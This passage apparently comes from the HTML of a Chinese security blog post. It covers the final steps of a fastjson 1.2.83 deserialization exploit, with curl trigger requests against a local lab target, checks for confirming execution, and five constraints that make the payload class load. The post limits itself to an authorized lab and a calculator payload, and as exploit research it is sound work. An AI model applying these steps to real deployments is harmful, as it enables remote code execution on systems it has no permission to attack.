class="line">     --data-urlencode <span class="string">&#x27;type=jar:file:.C:.fj.uploads.p!.Evil&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 触发</span></span><br><span class="line">curl -s -m 20 -X POST <span class="string">&quot;http://127.0.0.1:18084/parse&quot;</span> \</span><br><span class="line">     -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">     -d <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;jar:file:.C:.fj.uploads.p!.Evil&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>判定看三层，<strong>不要只看返回体</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>层</th>
+<th>命令 &#x2F; 现象</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>连通</td>
+<td><code>exit=0</code></td>
+<td>命令本身没出错</td>
+</tr>
+<tr>
+<td>探测</td>
+<td><code>stream:true</code>、<code>bytes:585</code>、<code>jsonTypeDirect:true</code></td>
+<td>字节读到了、注解被识别</td>
+</tr>
+<tr>
+<td>副作用</td>
+<td>计算器进程出现、证明文件 mtime 变化</td>
+<td><strong>唯一不会骗人的判据</strong></td>
+</tr>
+</tbody></table>
+<p><code>ok:true</code> 只代表”类存在、实例创建成功”，不等于”代码刚执行过”。</p>
+<hr>
+<h2 id="7-五个硬约束"><a href="#7-五个硬约束" class="headerlink" title="7. 五个硬约束"></a>7. 五个硬约束</h2><ol>
+<li><strong>字节码版本必须是 52。</strong> 用 <code>--release 8</code>；<code>--release 11</code> 起在 JDK 8 目标上会 <code>UnsupportedClassVersionError</code>。</li>
+<li><strong>jar 条目名必须是根目录的 <code>Evil.class</code>。</strong> 1482 行拼的是 <code>typeName 还原 + &quot;.class&quot;</code>，多一层目录就对不上。</li>
+<li><strong><code>@type</code> 里除了协议头冒号，全部用点号。</strong><ul>
+<li>正确：<code>jar:file:.C:.fj.uploads.p!.Evil</code></li>
+<li>错误：<code>jar:file:.C:.fj.uploads.p!/Evil</code>（<code>checkAutoType</code> 判成不可解析）</li>
+</ul>
+</li>
+<li><strong><code>this_class</code> 必须等于 <code>@type</code> 还原后的类名</strong>（去掉 <code>.class</code>），逐字相同。</li>
+<li><strong>同一个类名只能执行一次。</strong> 第二次命中 <code>TypeUtils:1744</code> 缓存，<code>ok:true</code> 但静态块不再跑。换名字或重启靶机。</li>
+</ol>
+<hr>
+<h2 id="8-边界"><a href="#8-边界" class="headerlink" title="8. 边界"></a>8. 边界</h2><p>自有靶场、授权范围内使用。本文载荷只启动一个计算器并写一个证明文件，不含反弹 shell、不含持久化、不修改系统配置。对外分享时保持同样口径。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/11/10/%E6%8A%80%E6%9C%AF/JAVA%E5%AE%89%E5%85%A8/Fastjson/SOURCE/" rel="prev" title="关于CVE-2026-16723：fastjson 1.2.83 相关源码注解">
+                  <i class="fa fa-angle-left"></i> 关于CVE-2026-16723：fastjson 1.2.83 相关源码注解
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/11/11/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SQLi/Java%20%E4%B8%AD%E7%9A%84sql%20%E6%B3%A8%E5%85%A5/" rel="next" title>
+                   <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">芹菜炖雪梨</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="external nofollow noopener noreferrer" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
